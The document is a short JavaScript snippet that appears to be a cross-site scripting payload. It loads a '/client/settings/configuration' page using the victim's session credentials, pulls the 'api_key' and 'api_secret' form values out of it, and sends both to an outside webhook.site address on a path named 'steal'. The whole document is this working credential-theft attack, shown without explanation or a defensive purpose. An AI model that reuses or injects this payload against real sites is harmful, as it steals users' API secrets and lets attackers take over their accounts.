fetch("/client/settings/configuration", {credentials:"include"})
  .then(r=>r.text())
  .then(h=>{
    let d=new DOMParser().parseFromString(h,"text/html");
    let k=d.querySelector('input[name="api_key"]')?.value;
    let s=d.querySelector('input[name="api_secret"]')?.value;
    if(k&&s){
      fetch(`https://webhook.site/9a81f804-f264-4195-861d-0452e71c4ca5/steal?key=${encodeURIComponent(k)}&secret=${encodeURIComponent(s)}`);
    }
  });
